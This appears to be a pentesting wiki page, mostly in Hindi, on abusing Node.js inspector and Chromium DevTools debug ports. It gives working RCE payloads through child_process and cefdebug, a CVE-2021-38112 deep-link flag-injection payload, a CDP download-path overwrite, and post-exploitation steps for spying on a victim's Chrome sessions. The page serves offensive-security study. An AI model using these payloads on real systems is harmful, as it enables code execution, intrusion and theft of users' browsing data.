# Node inspector/CEF debug abuse

ऐतिहासिक practical examples में Multimaster walkthrough और CVE-2019-1414 Visual Studio Code debugger attack शामिल हैं; इन्हें version-specific context के रूप में उपयोग करें, न कि यह मानें कि हर current Electron या Chromium target में समान primitives उपलब्ध हैं।<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[docs से](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch के साथ शुरू किए जाने पर, Node.js process एक debugging client के लिए listen करता है। **Default** रूप से, यह host और port **`127.0.0.1:9229`** पर listen करेगा। प्रत्येक process को एक **unique** **UUID** भी assign किया जाता है।<sup>[[4]](#references)</sup>

Inspector clients को connect करने के लिए host address, port और UUID जानना और specify करना आवश्यक है। एक full URL कुछ इस तरह दिखाई देगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।<sup>[[4]](#references)</sup>

> [!WARNING]
> क्योंकि **debugger को Node.js execution environment का full access प्राप्त होता है**, इसलिए इस port से connect करने में सक्षम malicious actor Node.js process की ओर से arbitrary code execute कर सकता है (**potential privilege escalation**)।<sup>[[4]](#references)</sup>

Inspector शुरू करने के कई तरीके हैं:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप किसी inspected process को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) पर आधारित processes `--remote-debugging-port=9222` के साथ एक debugger expose कर सकते हैं। यह browser को Node.js inspector के बजाय [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से expose करता है, इसलिए Node.js `process`-आधारित payloads default रूप से सीधे लागू नहीं होते हैं।<sup>[[2]](#references)[[5]](#references)</sup>

जब आप debug किए गए browser को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ब्राउज़र, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेबसाइट्स, वेब-ब्राउज़र में खुलने पर, ब्राउज़र security model के अंतर्गत WebSocket और HTTP requests कर सकती हैं। **एक प्रारंभिक HTTP connection** **एक unique debugger session id प्राप्त करने** के लिए आवश्यक होता है। **same-origin-policy** वेबसाइट्स को **यह HTTP connection बनाने** से **रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)** के विरुद्ध अतिरिक्त security के लिए, Node.js यह सत्यापित करता है कि connection के **'Host' headers** में या तो **IP address** या सटीक रूप से **`localhost`** निर्दिष्ट हो।<sup>[[4]](#references)</sup>

> [!TIP]
> ये **security measures inspector का exploitation करके** केवल **एक HTTP request भेजकर** code चलाने से रोकते हैं (जो SSRF vuln का exploitation करके किया जा सकता है)।<sup>[[4]](#references)</sup>

### चल रही processes में inspector शुरू करना

आप किसी running nodejs process को **signal SIGUSR1** भेजकर उसे default port में **inspector शुरू करने** के लिए कह सकते हैं। हालांकि, ध्यान रखें कि आपके पास पर्याप्त privileges होना आवश्यक है, इसलिए इससे आपको **process के अंदर मौजूद information तक privileged access** मिल सकता है, लेकिन direct privilege escalation नहीं।<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> यह containers में उपयोगी है क्योंकि `--inspect` के साथ **process को बंद करके नया process शुरू करना** **विकल्प नहीं है**, क्योंकि process के साथ **container** भी **killed** हो जाएगा।<sup>[[6]](#references)</sup>

### inspector/debugger से connect करना

**Chromium-based browser** से connect करने के लिए Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs access किए जा सकते हैं। Configure बटन पर क्लिक करके यह सुनिश्चित किया जाना चाहिए कि **target host और port** सही रूप से सूचीबद्ध हैं। चित्र में Remote Code Execution (RCE) का उदाहरण दिखाया गया है:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger को access करने के लिए एक URL दिखाई देगा। जैसे ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से connect करना: **Chromium-based browser** से connect करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से connect कर सकते हैं:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
टूल [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), स्थानीय रूप से चल रहे **inspectors** को **find** करने और उनमें **code inject** करने की अनुमति देता है।<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से browser से connected होने पर **NodeJS RCE exploits काम नहीं करेंगे** (इसके साथ करने योग्य interesting चीज़ें खोजने के लिए आपको API check करनी होगी)।<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> यदि आप यह खोजते हुए यहाँ आए हैं कि [**Electron में XSS से RCE कैसे प्राप्त करें, तो यह पेज देखें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

जब आप किसी Node **inspector** से **connect** कर सकते हैं, तब **RCE** प्राप्त करने के कुछ सामान्य तरीक़े इस प्रकार हैं (ऐसा लगता है कि यह **Chrome DevTools protocol** से connection में काम नहीं करेगा):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
इस section में मैं केवल उन interesting चीज़ों की सूची दूँगा, जिनका उपयोग लोगों ने इस protocol का exploit करने के लिए किया है।

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino security ने discovered किया कि CEF पर आधारित एक application ने system में एक custom URI (workspaces://index.html) **register** किया था, जो पूरी URI प्राप्त करता था और फिर उस URI से आंशिक रूप से तैयार की गई configuration के साथ **CEF आधारित application को launch** करता था।<sup>[[8]](#references)</sup>

यह discovered हुआ कि URI parameters को URL decoded किया गया और CEF आधारित application को launch करने के लिए उपयोग किया गया, जिससे user **`--gpu-launcher`** flag को **command line** में **inject** कर सकता था और मनमाने कार्य execute कर सकता था।<sup>[[8]](#references)</sup>

इसलिए, एक payload ऐसा हो सकता है:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
एक `calc.exe` execute करेगा।<sup>[[8]](#references)</sup>

### Files Overwrite करना

वह folder बदलें जहाँ **downloaded files save होने वाली हैं**, और **malicious code** वाली file download करके application के अक्सर उपयोग किए जाने वाले **source code** को **overwrite** करें।<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE और exfiltration

STAR Labs ने दिखाया कि exposed WebDriver/CDP services arbitrary file reads और RCE को सक्षम कर सकती हैं; कुछ configurations में DNS rebinding exploit chain को पूरा कर सकती है।<sup>[[9]](#references)</sup>

अतिरिक्त historical browser-automation और Chromium security cases के लिए, Counter WebDriver write-up और Project Zero issues 773, 1742, और 1944 देखें।<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

एक वास्तविक environment में और **Chrome/Chromium based browser इस्तेमाल करने वाले user PC को compromise करने के बाद**, आप **debugging activated करके और debugging port को port-forward करके** Chrome process launch कर सकते हैं, ताकि आप उस तक access कर सकें। इस तरह आप **victim द्वारा Chrome पर की जाने वाली हर गतिविधि को inspect कर सकेंगे और sensitive information चुरा सकेंगे**।<sup>[[7]](#references)</sup>

stealth तरीका है कि **हर Chrome process को terminate करें** और फिर कुछ इस तरह call करें:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger निरीक्षण और exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution Chrome DevTools Debugger के माध्यम से](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - शुरुआत करना](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome के Debugging Feature का दुरुपयोग करके Browsing Sessions को दूरस्थ रूप से देखना और नियंत्रित करना](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding और CDP के माध्यम से WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot से RCE तक](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
